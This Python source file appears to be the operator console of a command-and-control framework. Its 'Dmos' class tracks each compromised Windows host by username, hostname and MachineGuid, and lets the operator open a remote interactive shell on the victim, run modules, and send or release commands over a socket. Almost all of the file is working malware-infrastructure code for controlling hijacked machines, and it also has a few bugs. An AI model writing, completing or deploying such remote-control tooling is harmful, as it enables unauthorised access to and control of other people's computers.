import sys, os, threading, time, subprocess, json, readline
from hashlib import md5
from lib.helper import *
from lib.debug import Debug

class Dmos:
    def __init__(self, basic, sysinfo, global_addr, conn, c2):
        # basic
        self.GLOBAL         = global_addr
        self.LOCAL          = basic["local_addr"]
        self.USERNAME       = basic["user_name"]
        # sys
        self.HOSTNAME       = sysinfo["HOSTNAME"]
        self.OS             = sysinfo["OS"]
        self.ARCH           = sysinfo["ARCH"]
        self.MGUID          = sysinfo["MGUID"]
        # unique hash generated from MachineGuid in Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
        self.md5_hash       = md5(self.MGUID.encode()).hexdigest()
        self.born           = ctime()
        self.conn           = conn
        self.interactive    = False
        self.c2             = c2


    def interact(self):
        modules_multi = self.c2.modules_multi
        cmdList = ["free", "sysinfo", "fat", "clear", "b"] + modules_multi.keys()
        readline.set_completer(TabCompleter(cmdList).complete)
        while 1:
            command = Debug.prompt_input(f"[{self.USERNAME}@{self.GLOBAL}]>> ")
            cmd = command.split(' ')[0]
            args = command[len(cmd)+1:]

            if cmd in modules_multi.keys():
                modules_multi[cmd]._exec(self, args)
            elif command == "free":
                self.free_dmos()
                terminate(self.c2.multi_handler.dmoss, self, signal="gracefully")
                break
            elif command == "shell":
                self.interactive_shell()
            elif command == "sysinfo":
                self.system_info()
            elif command == "fat":
                self.conn.send(command.encode())
            elif command == "clear":
                os.system("clear")
            elif command == "b":
                self.c2.multi_handler.cmdline()

    def wrap_send(self, content, is_json=False):
        if is_json : data = json.dumps(content)
        try: 
            self.conn.send(data.encode())
        except:
            Debug.eprint("An unexpected error ocurred")
    def wrap_recieve(self):
        recv_data = ""
        while 1:
            try:
                recv_data += self.conn.recv(1024).decode()
                return recv_data
            except ValueError:
                continue
            else:
                Debug.eprint("An unexpected error ocurred")

    def free_dmos(self):
        self.conn.send("free".encode())
    def transfer(self, conn):
        """
        Macro function for interactive shell
        """
        Debug.tprint("""type "exit" to terminate the spawned shell (press enter to continue...)""")

        while self.interactive == True:
            try:
                buffer = conn.recv(0x400)
                sys.stdout.write(buffer.decode())
                sys.stdout.flush()
            except:
                interactive = False
    def interactive_shell(self):
        self.conn.send("shell".encode())

        self.interactive = True
        t = threading.Thread(target=self.transfer, args=(self.conn, ))
        t.start()
        while True:
            command = input().encode()
            if command == b"exit":
                self.conn.send(command + b"\n")
                self.interactive = False
                time.sleep(0.125)
                break
            self.conn.send(command + b"\n")

    def system_info(self):
        print("GLOBAL   : " + self.GLOBAL)
        print("LOCAL    : " + self.LOCAL)
        print("USERNAME : " + self.USERNAME)
        print("HOSTNAME : " + self.HOSTNAME)
        print("OS       : " + self.OS)
        print("ARCH     : " + self.ARCH)
        print("MGUID    : " + self.MGUID)
        print("HASH     : " + self.md5_hash)
        print("BORN     : " + self.born)

